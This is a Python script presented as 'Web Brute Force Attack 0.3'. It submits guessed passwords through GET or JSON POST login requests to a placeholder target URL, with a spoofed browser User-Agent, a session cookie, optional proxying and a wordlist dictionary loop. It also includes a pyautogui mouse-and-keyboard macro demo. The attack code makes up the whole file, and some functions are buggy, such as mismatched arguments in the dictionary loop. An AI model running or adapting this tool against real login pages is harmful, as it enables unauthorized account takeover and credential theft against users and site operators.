# -*- coding: utf-8 -*-
import random
import urllib.request  # Web Module
import urllib.parse  # Web Module
import urllib.error  # Web Module
import argparse  # options Module
import time  # sleep Module
import json  # json Module
import pyautogui  # Macro Module
import ctypes  # ctypes.windll.user32 -> import C library


def Main_title():
    print("######################################################")
    print("##           Web Brute Force Attack 0.3             ##")
    print("##                                                  ##")
    print("##                            Developed by nam3z1p  ##")
    print("##                                         2019.11  ##")
    print("######################################################")


class MACRO:
    def __init__(self):
        user32 = ctypes.windll.user32
        self.screen_width = user32.GetSystemMetrics(0)
        self.screen_height = user32.GetSystemMetrics(1)
        self.button = {
            'top_left': {'x': 30, 'y': 30},
            'bottom_right': {'x': 30, 'y': 30}
        }

    def MousePosition(self):
        x, y = pyautogui.position()
        print("x={0}, y={1}".format(x, y))

    def OpenTarget(self, delay):
        x = random.uniform(
            self.button['top_left']['x'], self.button['bottom_right']['x'])
        y = random.uniform(
            self.button['top_left']['y'], self.button['bottom_right']['y'])
        pyautogui.moveTo(x, y, duration=2)
        pyautogui.doubleClick()
        time.sleep(delay)

    def MoveTarget(self):
        # pyautogui.moveTo(self.screen_width, self.screen_height, duration=2)
        pyautogui.moveTo(200, 300, duration=2)
        pyautogui.click()
        time.sleep(2)

    def StopTarget(self):
        # pyautogui.moveTo(self.screen_width, self.screen_height, duration=2)
        pyautogui.moveTo(700, 200, duration=2)
        pyautogui.click()
        time.sleep(1)
        pyautogui.press('enter')

    def WriteTarget(self, text):
        pyautogui.keyDown('ctrl')
        pyautogui.keyDown('a')
        pyautogui.keyUp('a')
        pyautogui.keyUp('ctrl')
        pyautogui.typewrite(text, interval=0.1)
        time.sleep(2)


class WEB_ATTACK:
    def __init__(self):
        self.id = "test"
        self.TargetURL = "http://TargetURL"
        self.Cookie = "SessionId"
        self.Proxies = {0}
        # self.Proxies = {"http": "http://ProxyIP:8080", "https": "http://ProxyIP:8080"}
        self.wordlist = "wordlist.txt"

    def GET_Request(self, pw):
        # GET
        params = urllib.parse.urlencode(
            {'strUserId': self.id, 'strPassword': pw})
        full_url = self.TargetURL+"?"+params
        request = urllib.request.Request(full_url)
        # request = urllib.request.Request(self.TargetURL)

        # add Header
        request.add_header("Content-Type", "application/json; charset=UTF-8")
        request.add_header(
            "User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36")
        request.add_header("Cookie", self.Cookie)

        # Web_Request
        WEB_ATTACK().Web_Request(request, self.id, pw)

        # Dictionary_Request
        # WEB_ATTACK().Dictionary_Request(request, self.id)

    def POST_Request(self, pw):
        # POST
        # params = {'id':self.id, 'pwd':pw}
        # params = urllib.parse.urlencode(params)

        # POST - JSON
        params = {'strUserId': self.id, 'strPassword': pw}
        params = json.dumps(params).encode('utf-8')
        request = urllib.request.Request(self.TargetURL, params)

        # add Header
        request.add_header("Content-Type", "application/json; charset=UTF-8")
        request.add_header(
            "User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36")
        request.add_header("Cookie", self.Cookie)

        # Web_Request
        WEB_ATTACK().Web_Request(request, self.id, pw)

        # Dictionary_Request
        # WEB_ATTACK().Dictionary_Request(request, self.id)

    def Web_Request(self, request, id, pw):
        # Proxy Server Setting
        if self.Proxies != {0}:
            # proxy_support = urllib.request.ProxyHandler({"http": "http://ProxyIP:8080", "https": "http://ProxyIP:8080"})
            proxy_support = urllib.request.ProxyHandler(self.Proxies)
            opener = urllib.request.build_opener(proxy_support)
            urllib.request.install_opener(opener)
            print("[+] Setting Proxy Server")

        # Connection
        try:
            response = urllib.request.urlopen(request)
        except urllib.error.HTTPError as e:
            print("[-] Error code: ", e.getcode())
            print(e.read())

        if response.getcode() != 200:
            print("[-] Resopnse_status =", response.getcode())
            return 0

        # json data
        tran_data = response.read()
        json_data = json.loads(tran_data)
        msg = json_data['d']

        print("[+] Cracking The Password -> ["+id+"]")

        if msg == 1:
            print("######################################################")
            print("[+] Passwrod Crack Success !")
            print("[+] Userid -> ["+id+"], Passwrod -> ["+pw+"]")
            print("######################################################")
            return 0

        # Reponse Header
        # get_headers = response.info()
        # get_cookie = response.headers.get('Set-Cookie')
        # get_response = response.read()
        # get_response = response.read().decode('utf-8','ignore')
        # print(get_headers)
        # print(get_cookie)
        # print(get_response)

    def Dictionary_Request(self, id):
        # Open wordlist file
        files = open('./'+self.wordlist, 'r')

        # lines = filenames.readlines()
        lines = files.read().splitlines()

        for line in lines:
            # line.strip('\n')
            if WEB_ATTACK().Web_Request(id, line) == 0:
                return 0

            time.sleep(1)
        files.close()


def Main():

    Main_title()

    # options argument
    # parser = argparse.ArgumentParser()
    # parser.add_argument("-f", "--file", metavar="File Name", help="File Select")
    # options = parser.parse_args()
    # if options.file:

    # MACRO Sample (notepad)
    MACRO().MousePosition()
    MACRO().OpenTarget(1)
    MACRO().MoveTarget()
    MACRO().WriteTarget("Macro Test")
    MACRO().StopTarget()

    print("[+] Userid -> ["+WEB_ATTACK().id+"] Cracking...")

    target_pw = "test"

    if WEB_ATTACK().GET_Request(target_pw) == 0:
        print("[-] Failed passwrod crack")

    # if WEB_ATTACK().POST_Request(target_pw) == 0:
    #    print("[-] Failed passwrod crack")


if __name__ == "__main__":
    Main()
